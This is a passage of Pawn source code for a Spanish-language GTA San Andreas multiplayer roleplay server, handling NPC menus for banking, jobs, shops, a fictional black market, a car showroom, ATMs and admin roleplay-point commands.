					format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: Hasta luego!", nonplayers[iAtc][npcNombre]);
					Mensaje(playerid, COLOR_BLANCO, string);
				}
			}
			
			nonplayers[iAtc][npcUtil] = 0;
			booleano[npcUse]{playerid} = false;
			CancelSelectTextDraw(playerid);
			for(new ind=0;ind<6;ind++) TextDrawHideForPlayer(playerid, nonplayers[iAtc][interfaz][ind]);
			return 1;
		}
		for(new i=0;i<sizeof(nonplayers);i++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 2.0, nonplayers[i][npcPos][0], nonplayers[i][npcPos][1], nonplayers[i][npcPos][2]))
			{
				if(nonplayers[i][npcUtil] > gettime())
				{
					if(clickedid == nonplayers[i][interfaz][1])
					{
						switch(i)
						{
							case 0 .. 2://banqueros
							{
								if(cuenta[playerid][cCobro])
								{
									format(string, sizeof(string), "»{FFFFFF} Faltan %d minutos para el subsidio.", PayDayLeft);
									Mensaje(playerid, COLOR_AZUL_CLARO, string);
								}
								else
								{
									PayDay(playerid);
								}
							}
							case 3 .. 4://Ayuntamiento
							{
								DesaparecerSelecion(playerid, 0);
								ShowPlayerDialog(playerid, DIALOGO_IMPUESTO_CASAS, DIALOG_STYLE_LIST, "Pagar impuestos de sus casas", "{008000}[*]{FFFFFF} Primer Casa\n{008000}[*]{FFFFFF} Segunda Casa {E4A54D}[VIP]", "Aceptar", "Salir");
							}
							case 5:
							{
								if(!cuenta[playerid][cIdentificacion])
								{
									iAtc = entero[playerid][eActId];
									
									format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: Llene sus datos!", nonplayers[iAtc][npcNombre]);
									Mensaje(playerid, COLOR_BLANCO, string);

									nonplayers[iAtc][npcUtil] = 0;
									booleano[npcUse]{playerid} = false;
									CancelSelectTextDraw(playerid);
									for(new ind=0;ind<6;ind++) TextDrawHideForPlayer(playerid, nonplayers[iAtc][interfaz][ind]);

									DniValores[playerid][0] = 1;
									DniValores[playerid][1] = 100000 + random(999999);
									cuenta[playerid][cOrigen] = 1;
									cuenta[playerid][cSexo] = 1;
									cuenta[playerid][cEdad] = 21;
									booleano[_ComprandoDNI]{playerid} = true;
									
									PlayerTextDrawShow(playerid, InfoText[playerid][5]);
									PlayerTextDrawShow(playerid, InfoText[playerid][6]);
									PlayerTextDrawShow(playerid, InfoText[playerid][7]);//Atras
									PlayerTextDrawShow(playerid, InfoText[playerid][8]);//Adelante
									PlayerTextDrawShow(playerid, InfoText[playerid][9]);//Siguiente
									PlayerTextDrawShow(playerid, InfoText[playerid][10]);//Listo
									SelectTextDraw(playerid, COLOR_LIMA);
									UpdateDniInformacion(playerid, 1);
								}else return Mensaje(playerid, COLOR_ROJO, "Usted ya esta legalizado en la ciudad.");
							}
							case 6 .. 19, 46:
							{
								if(cuenta[playerid][cTrabajo])return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted ya tiene trabajo, puede ir con el encargado y renunciar.");
								for(new k=0; k<sizeof(trabajos); k++)
								{
									if(IsPlayerInRangeOfPoint(playerid, 5.0, trabajos[k][trabPos][0], trabajos[k][trabPos][1], trabajos[k][trabPos][2]))
									{
										if(cuenta[playerid][cNivel] < trabajos[k][trabNivel])
										{
											format(string, sizeof(string), "Usted debe ser nivel %d o superior para ser %s.", trabajos[k][trabNivel], trabajos[k][trabNombre]);
											Mensaje(playerid, COLOR_ROJO, string);
											return 1;
										}
										if(trabajos[k][trabLic])
										{
											switch(trabajos[k][trabLic])
											{
												case 1:
												{
													if(!cuenta[playerid][cLicenciaMoto])
													{
														format(string, sizeof(string), "Usted necesita licencia de moto para ser %s.", trabajos[k][trabNombre]);
														Mensaje(playerid, COLOR_ROJO, string);
														return 1;
													}
												}
												case 2:
												{
													if(!cuenta[playerid][cLicenciaAuto])
													{
														format(string, sizeof(string), "Usted necesita licencia de conduccion para ser %s.", trabajos[k][trabNombre]);
														Mensaje(playerid, COLOR_ROJO, string);
														return 1;
													}
												}
												case 3:
												{
													if(!cuenta[playerid][cLicenciaVuelo])
													{
														format(string, sizeof(string), "Usted necesita licencia de vuelo para ser %s.", trabajos[k][trabNombre]);
														Mensaje(playerid, COLOR_ROJO, string);
														return 1;
													}
												}
												case 4:
												{
													if(!cuenta[playerid][cLicenciaBote])
													{
														format(string, sizeof(string), "Usted necesita licencia de navegacion para ser %s.", trabajos[k][trabNombre]);
														Mensaje(playerid, COLOR_ROJO, string);
														return 1;
													}
												}
												case 5:
												{
													if(!cuenta[playerid][cLicenciaArma])
													{
														format(string, sizeof(string), "Usted necesita licencia de armas para ser %s.", trabajos[k][trabNombre]);
														Mensaje(playerid, COLOR_ROJO, string);
														return 1;
													}
												}
											}
										}
										
										GameTextForPlayer(playerid, "~w~felicidades por tu nuevo trabajo", 5000, 3);
										cuenta[playerid][cTrabajo] = k;
										cuenta[playerid][cEmpleado] = trabajos[k][trabHoras];
										UpdatePlayerStat(playerid);				

										format(string, sizeof(string), "Has firmado el contrato de %s por %d hora(s).", trabajos[k][trabNombre], trabajos[k][trabHoras]);
										Mensaje(playerid, COLOR_BLANCO, string);
										break;
									}
								}
							}
							case 20:
							{
								DesaparecerSelecion(playerid, 0);
								ShowPlayerDialog(playerid, DIALOGO_COMPRAR_MNEGRO, DIALOG_STYLE_TABLIST_HEADERS, "Mercado Negro", 
								" \
								Articulo\tPrecio\tCantidad\n\
								{FF7F00}[*]{FFFFFF} Puño Americano\t{008000}20$\n\
								{FF7F00}[*]{FFFFFF} Máscara\t{008000}50$\n\
								{FF7F00}[*]{FFFFFF} Ganzúas\t{008000}120$\n\
								{FF7F00}[*]{FFFFFF} Soga + Venda\t{008000}120$\n\
								{FF7F00}[*]{FFFFFF} Pistola 9mm\t{008000}300$\t11 Balas\n\
								{FF7F00}[*]{FFFFFF} Bate\t{008000}50$\n\
								{FF7F00}[*]{FFFFFF} Palo de Golf\t{008000}60$\n\
								{FF7F00}[*]{FFFFFF} Speed\t{008000}1500$\t50 semillas\n\
								{FF7F00}[*]{FFFFFF} Extasis\t{008000}3000$\t50 semillas\n\
								{FF7F00}[*]{FFFFFF} Ritalin\t{008000}4250$\t50 semillas\n\
								{FF7F00}[*]{FFFFFF} Heroina\t{008000}6000$\t50 semillas\n\
								{FF7F00}[*]{FFFFFF} Marihuana\t{008000}4500$\t50 semillas\
								", "Aceptar", "Salir");
							}
							case 21:
							{
								if(IsACop(playerid))
								{
									if(!booleano[OnDuty]{playerid})
									{
										format(string, sizeof(string), "* %s coge su placa y su radio.", PlayerName(playerid));
										ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
										booleano[OnDuty]{playerid} = true;
									}else{
										format(string, sizeof(string), "* %s deja su placa y su radio.", PlayerName(playerid));
										ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
										quitarArmas(playerid);
										booleano[OnDuty]{playerid} = false;
									}
								}
							}
							case 23 .. 27:
							{
								if(IsPlayerConnected(playerid))
								{
									DesaparecerSelecion(playerid, 0);
									ShowPlayerDialog(playerid, DIALOGO_COMPRA_247, DIALOG_STYLE_LIST, "Comprar - 24 7", "Loteria - Costo: {008000}15$\nSpray Anti-Ladrones - Costo: {008000}70$\nCigarros - Costo: {008000}10$\nEncendedor - Costo: {008000}5$\nGafas RayBan - Costo: {008000}300$\nMaleta - Costo: {008000}175$\nMochila - Costo: {008000}75$\nCasco - Costo: {008000}120$\nPatines - Costo: {008000}50$\nPeriodico - Costo: {008000}35$", "Comprar", "Cancelar");
								}
							}
							case 28 .. 35, 47:
							{
								new cadena[312];
								format(cadena, sizeof(cadena), "Bebida\tPrecio\n");
								for(new b=0;b<sizeof(Bebidas);b++)
								{
									format(cadena, sizeof(cadena), "%s\n%s\t{008000}%d${ffffff}", cadena, Bebidas[b][b@Nombre], Bebidas[b][b@costo]);
								}
								DesaparecerSelecion(playerid, 0);
								ShowPlayerDialog(playerid, DIALOGO_MENU_BEBIDAS, DIALOG_STYLE_TABLIST_HEADERS, "Venta de bebidas", cadena, "Aceptar", "Cancelar");
								return 1;
							}
							case 36 .. 41:
							{
								if(IsPlayerInRangeOfPoint(playerid, 5, 377.2972, -67.4351, 1001.5078))
								{//burguer
									ShowPlayerDialog(playerid, COMIDA_MENU, DIALOG_STYLE_LIST, "Menú Hamburguesas", "- Hamburgesa con Queso 20$\n- Hamburgesa Sola 10$\n- Hamburgesa Completa con Papas 50$\n- Papas Fritas 5$\n- Combo Completo 100$\n- Nuggets 35$", "Aceptar", "Salir");
									enteroChar[dComida]{playerid} = 1;
								}
								else if(IsPlayerInRangeOfPoint(playerid, 5, 372.9010, -118.8029, 1001.4922))
								{//pizza
									ShowPlayerDialog(playerid, COMIDA_MENU, DIALOG_STYLE_LIST, "Menú Pizzas", "- Pizza Chica 30$\n- Pizza Mediana 45$\n- Pizza Grande 60$\n- Pizza en Cono 20$", "Aceptar", "Salir");
									enteroChar[dComida]{playerid} = 2;
								}
								else if(IsPlayerInRangeOfPoint(playerid, 5, 369.5900, -6.0166, 1001.8589))
								{//pollo
									ShowPlayerDialog(playerid, COMIDA_MENU, DIALOG_STYLE_LIST, "Menú Pollos", "- Pollo Solo 10$\n- Pollo con Tocino 20$\n- Pollo con papas 40$\n- Pollo deshuesado 20$\n- Pollo Frito 120$", "Aceptar", "Salir");
									enteroChar[dComida]{playerid} = 3;
								}
							}
							case 42:
							{
								DesaparecerSelecion(playerid, 0);
								ShowPlayerDialog(playerid, TIENDA_ELECTRONICA, DIALOG_STYLE_LIST, "Tienda Electronica", "iPhone - Costo: {008000}200$\nIpod - Costo: {008000}280$\nCámara - Costo: {008000}100$\nWalkie- Costo: {008000}260$\nStereo - Costo: {008000}100$", "Aceptar", "Cancelar");
							}
							case 43:
							{
								iAtc = entero[playerid][eActId];
								format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: Elija la licencia que desea sacar!", nonplayers[iAtc][npcNombre]);
								Mensaje(playerid, COLOR_BLANCO, string);

								nonplayers[iAtc][npcUtil] = 0;
								booleano[npcUse]{playerid} = false;
								CancelSelectTextDraw(playerid);
								for(new ind=0;ind<6;ind++) TextDrawHideForPlayer(playerid, nonplayers[iAtc][interfaz][ind]);

								ShowPlayerDialog(playerid, DIALOGO_OBTENER_LICENCIA, DIALOG_STYLE_LIST, "Examenes Disponibles", "Licencia de Motos - Costo: {008000}250$\nLicencia de Vehiculos - Costo: {008000}450$\nLicencia de Vuelo - Costo: {008000}7000$\nLicencia de Botes - Costo: {008000}2500$", "Aceptar", "Cancelar");
							}
							case 44 .. 45:
							{
								MostrarVisualizacion(playerid, 0);
							}
							case 48, 49:
							{
								iAtc = entero[playerid][eActId];
								nonplayers[iAtc][npcUtil] = 0;
								booleano[npcUse]{playerid} = false;
								CancelSelectTextDraw(playerid);
								for(new ind=0;ind<6;ind++) TextDrawHideForPlayer(playerid, nonplayers[iAtc][interfaz][ind]);
								
								format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: Disfrute el catalogo!", nonplayers[iAtc][npcNombre]);
								Mensaje(playerid, COLOR_BLANCO, string);
								ShowPlayerDialog(playerid, DIALOGO_COMPRAR_ROPA, DIALOG_STYLE_MSGBOX, "Catalago de ropa", "{ffffff}En breve le sera mostrado un catalogo.", "Aceptar", "");
							}
						}
					}
					else if(clickedid == nonplayers[i][interfaz][2])
					{
						switch(i)
						{
							case 0 .. 2://banqueros
							{
								if(cuenta[playerid][cTarjeta] != 0)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted ya tiene una tarjeta de crédito.");
								if(obtenerDinero(playerid) < 120)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted debe poseer 1500$ para comprar su tarjeta de crédito.");
								pierdeDinero(playerid, 120);
								cuenta[playerid][cTarjeta] = 123456 + random(6543);
								format(string, sizeof(string), "Atención:{FFFFFF} Usted compró una tarjeta de crédito, Numero: %d", cuenta[playerid][cTarjeta]);
								Mensaje(playerid, COLOR_AZUL_CLARO, string);
								format(string, sizeof(string), "* %s compra una tarjeta de credito", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
							}
							case 3 .. 4://Ayuntamiento
							{
								DesaparecerSelecion(playerid, 0);
								ShowPlayerDialog(playerid, DIALOGO_IMPUESTO_NEGOCIOS, DIALOG_STYLE_LIST, "Pagar impuestos de sus negocios", "{008000}[*]{FFFFFF} Primer Negocio\n{008000}[*]{FFFFFF} Segundo Negocio {E4A54D}[VIP]", "Aceptar", "Salir");
							}
							case 5:
							{
								ShowPlayerDialog(playerid, DIALOGO_CAMBIO_NACION, DIALOG_STYLE_LIST, "Cambio de Nacionalidad [Coste 3000$]", "{008000}[*]{FFFFFF} Japon\n{008000}[*]{FFFFFF} Italia\n{008000}[*]{FFFFFF} Arabe\n{008000}[*]{FFFFFF} Rusia\n{008000}[*]{FFFFFF} Francia\n{008000}[*]{FFFFFF} China\n{008000}[*]{FFFFFF} Alemania\n{008000}[*]{FFFFFF} Argentina\n{008000}[*]{FFFFFF} Colombia\n{008000}[*]{FFFFFF} Bolivia\n{008000}[*]{FFFFFF} Brasil\n{008000}[*]{FFFFFF} Chile\n{008000}[*]{FFFFFF} España\n{008000}[*]{FFFFFF} Mexico\n{008000}[*]{FFFFFF} Ecuador\n{008000}[*]{FFFFFF} Estados Unidos\n{008000}[*]{FFFFFF} Holanda\n{008000}[*]{FFFFFF} Canada\n{008000}[*]{FFFFFF} Uruguay\n{008000}[*]{FFFFFF} Venezuela", "Aceptar", "Salir");
							}
							case 6 .. 19, 46:
							{
								if(!cuenta[playerid][cTrabajo])return Mensaje(playerid, COLOR_ROJO, "Usted esta desempleado.");
								if(cuenta[playerid][cTrabajo] && cuenta[playerid][cEmpleado] < 1)
								{
									cuenta[playerid][cTrabajo] = 0;
									cuenta[playerid][cEmpleado] = 0;
									UpdatePlayerStat(playerid);
									Mensaje(playerid, COLOR_GRIS, "Usted renuncio a su trabajo actual.");
								}
								else
								{
									format(string, sizeof(string), "Tienes %d horas de contrato a cumplir todavia.", cuenta[playerid][cEmpleado]);
									Mensaje(playerid, COLOR_AMARILLO, string);
								}
							}
							case 20:
							{
							
							}
							case 21:
							{
								if(Team_LSPD(playerid))
								{
									DesaparecerSelecion(playerid, 0);
									ShowPlayerDialog(playerid, DIALOGO_EQUIPO_LSPD, DIALOG_STYLE_LIST, ">> Equipo Policía <<", "» Rango 1: {868FD9}Cadete\n{FFFFFF}» Rango 2: {868FD9}Oficial\n{FFFFFF}» Rango 3: {868FD9}Agente\n{FFFFFF}» Rango 4: {868FD9}Sargento\n» Rango 5: {868FD9}Capitán\n» Rango 6: {868FD9}Comandante\n{FFFFFF}» Rangos Especiales: {868FD9}SWAT\n{FFFFFF}» Rangos Especiales: {868FD9}ANON\n{FFFFFF}» Rangos Especiales: {868FD9}CROSS\n{FFFFFF}» Rangos Especiales: {868FD9}EAGLE\n{FFFFFF}» Rangos Especiales: {868FD9}WALKER\n{FFFFFF}» Inyecciones de Energía y Chaleco\n» Pistola + Porra\n» Equipo Femenino\n» Ropa Normal", "Equipar", "Cancelar");
								}
							}
							case 23 .. 27:
							{
								if(!cuenta[playerid][cTelefono])return Mensaje(playerid, COLOR_GRIS2, "No tienes teléfono, compra uno en la tienda electronica.");
								ShowPlayerDialog(playerid, DIALOGO_RECARGAR_TELEFONO, DIALOG_STYLE_INPUT, "{018CFE}Operadora de Telefonia Celular MOVISTAR", "{FFFFFF}Ingresa tu numero celular para realizar la recarga", "Aceptar", "Cancelar");
							}
							case 28 .. 35:
							{
							
							}
							case 44 .. 45:
							{
								MostrarVisualizacion(playerid, 1);
							}
							case 48, 49:
							{
								format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: Disfrute el catalogo!", nonplayers[iAtc][npcNombre]);
								Mensaje(playerid, COLOR_BLANCO, string);

								nonplayers[iAtc][npcUtil] = 0;
								booleano[npcUse]{playerid} = false;
								CancelSelectTextDraw(playerid);
								for(new ind=0;ind<6;ind++) TextDrawHideForPlayer(playerid, nonplayers[iAtc][interfaz][ind]);

								ShowPlayerDialog(playerid, BUYTOYS, DIALOG_STYLE_MSGBOX, "Tienda de Accesorios", "Bienvenido a la tienda de accesorios! Aquí puedes comprar accesorios para ti.\nRecuerda que puedes usar 5 objetos a la vez.", "Continuar", "Cancelar");
							}
						}
					}
					else if(clickedid == nonplayers[i][interfaz][3])
					{
						switch(i)
						{
							case 0 .. 2://banqueros
							{
							
							}
							case 3 .. 4://Ayuntamiento
							{
								DesaparecerSelecion(playerid, 0);
								ShowPlayerDialog(playerid, DIALOGO_IMPUESTO_AUTOS, DIALOG_STYLE_LIST, "Pagar impuestos de sus vehiculos", "{008000}[*]{FFFFFF} Primer Vehiculo\n{008000}[*]{FFFFFF} Segundo Vehiculo\n{008000}[*]{FFFFFF} Tercer Vehiculo {E4A54D}[VIP]\n{008000}[*]{FFFFFF} Cuarto Vehiculo {E4A54D}[VIP]", "Aceptar", "Salir");
							}
							case 5:
							{

							}
							case 6 .. 19, 46:
							{
								new k = cuenta[playerid][cTrabajo];
								if(!k)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted esta desempleado.");
								if(k == 15)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no necesita estar en servicio.");
								if(IsPlayerInRangeOfPoint(playerid, 5.0, trabajos[k][trabPos][0], trabajos[k][trabPos][1], trabajos[k][trabPos][2]))
								{
									if(!cuenta[playerid][servicio])
									{
										cuenta[playerid][servicio] = true;
										SetPlayerSkin(playerid, trabajos[k][trabSkin]);
										format(string, sizeof(string), "{008000}INFO: {FFFFFF}Puede comenzar a trabajar como {008000}%s.", trabajos[k][trabNombre]);
										Mensaje(playerid, COLOR_BLANCO, string);
										Mensaje(playerid, COLOR_ROJO, "[!] {FFFFFF}Use {AA3333}/finservicio {FFFFFF}cuando halla dejado de trabajar para recibir su pago!");
										Mensaje(playerid, COLOR_AMARILLO, "[!] {FFFFFF}Para ver los comandos disponibles use {FFFF00}/ayuda --> Trabajos");
										Mensaje(playerid, COLOR_AMARILLO, "[!] {FFFFFF}Para subir la habilidad de los trabajos use {FFFF00}/habilidad");

										switch(k)
										{
											case 9:
											{
												format(string, sizeof(string), "** El taxista %s esta en servicio llame al %d.", PlayerName(playerid), cuenta[playerid][cTelefono]);
												OOCNews(COLOR_LIMA, string);
											}				
											case 12:
											{
												SetPlayerAttachedObject(playerid, 9, 18634, 6, 0.083024, 0.037154, 0.057157, 90.446144, 301.829162, 0.702633, 1.930997, 1.135378, 1.382053);
											}				
											case 13:
											{
												SetPlayerAttachedObject(playerid, 9, 18635, 6, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 1.0, 1.0);
											}				
											case 14:
											{
												SetPlayerAttachedObject(playerid, 9, 18635, 6, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 1.0, 1.0);
											}
										}
									}
								}else return Mensaje(playerid, COLOR_ROJO, "Usted no esta cerca de su trabajo.");
							}
							case 20:
							{
							
							}
							case 44 .. 45:
							{
								MostrarVisualizacion(playerid, 2);
							}
						}
					}
					else if(clickedid == nonplayers[i][interfaz][4])
					{
						switch(i)
						{
							case 0 .. 2://banqueros
							{
							
							}
							case 3 .. 4://Ayuntamiento
							{
							
							}
							case 5:
							{
							
							}
							case 6 .. 19:
							{
							
							}
							case 20:
							{
							
							}
							case 44 .. 45:
							{
								MostrarVisualizacion(playerid, 3);
							}
						}
					}
				}
			}
		}
	}
	//Sistema de visualizacion
	if(sv != 255)
	{
		static sumar;
		if(clickedid == visualizador[sv][tdrawID][0])
		{
			sumar++;
			if(sumar < 1 || sumar > 46 || !visualizador[sv][visualModel][sumar]) sumar = 1;
			DestroyVehicle(visualizador[sv][visualCoche]);
			
			for(new k=0; k<sizeof vehiculosPrecios; k++)
			{
				if(vehiculosPrecios[k][vPmodelo] != visualizador[sv][visualModel][sumar]) continue;
				
				new Cache:mdl;
				mysql_format(servidor[mysqlControl], string, sizeof(string), "SELECT * FROM zz_coches WHERE modelo = '%d';", vehiculosPrecios[k][vPmodelo]);
				mdl = mysql_query(servidor[mysqlControl], string, true);
				
				format(string, sizeof(string), "~y~~h~MODELO: ~w~%s - ~y~~h~PRECIO: ~w~%d$ - ~y~~h~STOCK: %s", CarName[vehiculosPrecios[k][vPmodelo] - 400], vehiculosPrecios[k][vPvalor], cache_get_row_count() >= vehiculosPrecios[k][vStockmax] ? ("~r~AGOTADO") : ("~g~DISPONIBLE"));
				TextDrawSetString(visualizador[sv][tdrawID][2], string);
				cache_delete(mdl);
				break;
			}			
			visualizador[sv][visualCoche] = CreateVehicleEx(visualizador[sv][visualModel][sumar], visualizador[sv][visualPos][0], visualizador[sv][visualPos][1], visualizador[sv][visualPos][2], visualizador[sv][visualPos][3], random(128), random(128), 100);	
			SetVehicleVirtualWorld(visualizador[sv][visualCoche], visualizador[sv][visualInt]);
		}
		else if(clickedid == visualizador[sv][tdrawID][1])
		{
			sumar--;
			if(!visualizador[sv][visualModel][sumar]) sumar = 1;
			DestroyVehicle(visualizador[sv][visualCoche]);
			
			for(new k=0; k<sizeof vehiculosPrecios; k++)
			{
				if(vehiculosPrecios[k][vPmodelo] != visualizador[sv][visualModel][sumar]) continue;
				
				new Cache:mdl;
				mysql_format(servidor[mysqlControl], string, sizeof(string), "SELECT * FROM zz_coches WHERE modelo = '%d';", vehiculosPrecios[k][vPmodelo]);
				mdl = mysql_query(servidor[mysqlControl], string, true);
				
				format(string, sizeof(string), "~y~~h~MODELO: ~w~%s - ~y~~h~PRECIO: ~w~%d$ - ~y~~h~STOCK: %s", CarName[vehiculosPrecios[k][vPmodelo] - 400], vehiculosPrecios[k][vPvalor], cache_get_row_count() >= vehiculosPrecios[k][vStockmax] ? ("~r~AGOTADO") : ("~g~DISPONIBLE"));
				TextDrawSetString(visualizador[sv][tdrawID][2], string);
				cache_delete(mdl);
				break;
			}
			
			visualizador[sv][visualCoche] = CreateVehicleEx(visualizador[sv][visualModel][sumar], visualizador[sv][visualPos][0], visualizador[sv][visualPos][1], visualizador[sv][visualPos][2], visualizador[sv][visualPos][3], random(128), random(128), 100);	
			SetVehicleVirtualWorld(visualizador[sv][visualCoche], visualizador[sv][visualInt]);
		}
		else if(clickedid == visualizador[sv][tdrawID][3])
		{
			for(new k=0; k<sizeof vehiculosPrecios; k++)
			{
				if(vehiculosPrecios[k][vPmodelo] != visualizador[sv][visualModel][sumar]) continue;
				
				new Cache:mdl;
				mysql_format(servidor[mysqlControl], string, sizeof(string), "SELECT * FROM zz_coches WHERE modelo = '%d';", vehiculosPrecios[k][vPmodelo]);
				mdl = mysql_query(servidor[mysqlControl], string, true);
				
				ComproVehiculo(playerid, vehiculosPrecios[k][vPmodelo], vehiculosPrecios[k][vPvalor], cache_get_row_count(), vehiculosPrecios[k][vStockmax]);
				cache_delete(mdl);
				break;
			}
		}
		else if(clickedid == visualizador[sv][tdrawID][4])
		{
			SalirVisualizacion(playerid, sv);
		}
	}
	//Sistema de cajero
	if(enteroChar[cajeroslot]{playerid} != 255)
	{
		if(clickedid == cajeros[enteroChar[cajeroslot]{playerid}][Textdcajero][5])
		{
			actualizarCajero(playerid);
			ShowPlayerDialog(playerid, DIALOGO_SACAR, DIALOG_STYLE_INPUT, "{F07A04}Center Island - Sacar", "{FFFFFF}Escriba la cantidad exacta del dinero que quiere sacar", "Aceptar", "Cancelar");
		}
		else if(clickedid == cajeros[enteroChar[cajeroslot]{playerid}][Textdcajero][6])
		{
			actualizarCajero(playerid);
			ShowPlayerDialog(playerid, DIALOGO_DEPOSITO, DIALOG_STYLE_INPUT, "{F07A04}Center Island - Depositar", "{FFFFFF}Escriba la cantidad exacta del dinero que quiere depositar", "Aceptar", "Cancelar");
		}
		else if(clickedid == cajeros[enteroChar[cajeroslot]{playerid}][Textdcajero][7])
		{
			if(cuenta[playerid][cNivel] < 4)return Mensaje(playerid, COLOR_ROJO, "Para transferir dinero debes ser nivel 4 o mayor.");
			ShowPlayerDialog(playerid, DIALOGO_TRANSFERENCIA, DIALOG_STYLE_INPUT, "{F07A04}Center Island - Tansferir", "{FFFFFF}Escriba el Nombre_Apellido de la cuenta a la que realizará la transacción.", "Aceptar", "Cancelar");
			actualizarCajero(playerid);
		}
		else if(clickedid == cajeros[enteroChar[cajeroslot]{playerid}][Textdcajero][8])
		{
			if(cuenta[playerid][cCobro])
			{
				format(string, sizeof(string), "»{FFFFFF} Faltan %d minutos para el subsidio.", PayDayLeft);
				Mensaje(playerid, COLOR_AZUL_CLARO, string);
			}
			else
			{
				PayDay(playerid);
			}
			actualizarCajero(playerid);
		}
		else if(clickedid == cajeros[enteroChar[cajeroslot]{playerid}][Textdcajero][9])
		{
			ocultarCajero(playerid);
		}
	}
  	return 1;
}
command(tiemposubsidio, playerid, params[])
{
	new string[64];
	format(string, sizeof(string), "»{FFFFFF} Faltan %d minutos para el subsidio.", PayDayLeft);
	return Mensaje(playerid, COLOR_CIAN, string);
}
command(puntorol, playerid, params[]){
	new player, item[8], string[144];
	if(cuenta[playerid][cAdministrador] < 4)return Mensaje(playerid, COLOR_GRIS2, "No Autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(sscanf(params, "s[8]d", item, player))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /puntorol [Dar - Quitar] [Jugador]");
	
	if(!strcmp("dar", item)){
		if(cuenta[player][cPuntosRol] > 10){
			cuenta[player][cPuntosRol] = 10;
			Mensaje(playerid, COLOR_GRIS2, "Este jugador tiene el maximo de puntos");
			return 1;
		}
		
		cuenta[player][cPuntosRol] += 1;
		format(string, sizeof(string), "Administrador %s te dio 1 punto de rol", Nombre(playerid));
		Mensaje(player, COLOR_AMARILLO2, string);
		format(string, sizeof(string), "Administrador %s dio 1 punto de rol a %s", Nombre(playerid), Nombre(player));
		AdminMensaje(string);
		printf("PUNTOS ROL: %s", string);
	}
	else if(!strcmp("quitar", item)){		
		cuenta[player][cPuntosRol] -= 1;
		format(string, sizeof(string), "Administrador %s te quito 1 punto de rol", Nombre(playerid));
		Mensaje(player, COLOR_AMARILLO2, string);
		format(string, sizeof(string), "Administrador %s quito 1 punto de rol a %s", Nombre(playerid), Nombre(player));
		AdminMensaje(string);
		printf("PUNTOS ROL: %s", string);
		
		if(cuenta[player][cPuntosRol] <= -10){
			cuenta[player][cADVRol] += 1;
			if(cuenta[player][cADVRol] >= 3){
				Mensaje(player, -1, ""COL_ROJO"[BAN]"COL_BLANCO" Has sido baneado del servidor por alcanzar el máximo de advertencias de rol");
				Mensaje(player, COLOR_GRIS2, "Puedes apelar en el foro");
				ban(player, "Limite de advertencias", Nombre(playerid), "Ninguno");
			}else{
				Mensaje(player, -1, ""COL_ROJO"[ADVERTENCIA] "COL_BLANCO"Haz alcanzado -10 puntos de rol, has recibido 1 advertencia de rol");
				Mensaje(player, COLOR_GRIS2, "3 Advertencias de rol conllevarán el baneo de esta cuenta!");
				Mensaje(player, COLOR_GRIS2, "Tus puntos de rol se han fijado en -8 otra vez");
				cuenta[player][cPuntosRol] = -8;
				cuenta[player][cADVRol] += 1;
			}
			return 1;
		}
	}
	return 1;
}

PreloadAnimLib(playerid, animlib[])
{
    ApplyAnimation(playerid, animlib, "null", 0.0, 0, 0, 0, 0, 0);
}

command(rc, playerid, params[])
{
	new string[128];
	if(cuenta[playerid][cTrabajo] == 8)
	{
	    if(sscanf(params, "s[128]", params[0]))return Mensaje(playerid, COLOR_GRIS2, "[ERROR] Utiliza:: /rc + mensaje");
        for(new i=0, _max=GetMaxPlayers();i<_max;i++)
		{
			if(cuenta[i][cTrabajo] == 8)
			{
			    format(string, sizeof(string), ""COL_AZUL_CLARO"[R.CAMIONEROS]"COL_BLANCO"%s:"COL_GRIS" %s", PlayerName(playerid), params[0]);
			    Mensaje(i, -1, string);
			}
		}
	} else return Mensaje(playerid, COLOR_GRIS2, "[ERROR] No eres camionero");
	return 1;
}

public OnPlayerFloodControl(playerid, iCount, iTimeSpan)
{
    if(iCount > 2 && iTimeSpan < 8000)
	{
		new tmp15[24], tmp16[32];
		format(tmp16, sizeof(tmp16), "0xFF%dA%dA", iTimeSpan, iCount);
		format(tmp15, sizeof(tmp15), "[NPC]%s", nonplayers[random(sizeof(nonplayers))][npcNombre]);
		ban(playerid, "Anti Flood Bot", tmp15, tmp16);
    }
	return 1;
}

public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
	if(playertextid == InfoText[playerid][7])
	{
		switch(DniValores[playerid][0])
		{
			case 1:
			{
				if(cuenta[playerid][cEdad] > 18)
				{
					cuenta[playerid][cEdad]--;
				}
				UpdateDniInformacion(playerid, 1);
			}
			case 2:
			{
				if(cuenta[playerid][cSexo] == 1)
				{
					cuenta[playerid][cSexo] = 2;
				}
				else
				{
					cuenta[playerid][cSexo] = 1;
				} 
				UpdateDniInformacion(playerid, 2);
			}
			case 3:
			{
				if(cuenta[playerid][cOrigen] > 1)
				{
					cuenta[playerid][cOrigen]--;
				}
				UpdateDniInformacion(playerid, 3);
			}
		}
	}
	else if(playertextid == InfoText[playerid][8])
	{
		switch(DniValores[playerid][0])
		{
			case 1:
			{
				if(cuenta[playerid][cEdad] < 84)
				{
					cuenta[playerid][cEdad]++;
				}
				UpdateDniInformacion(playerid, 1);
			}
			case 2:
			{
				if(cuenta[playerid][cSexo] == 1)
				{
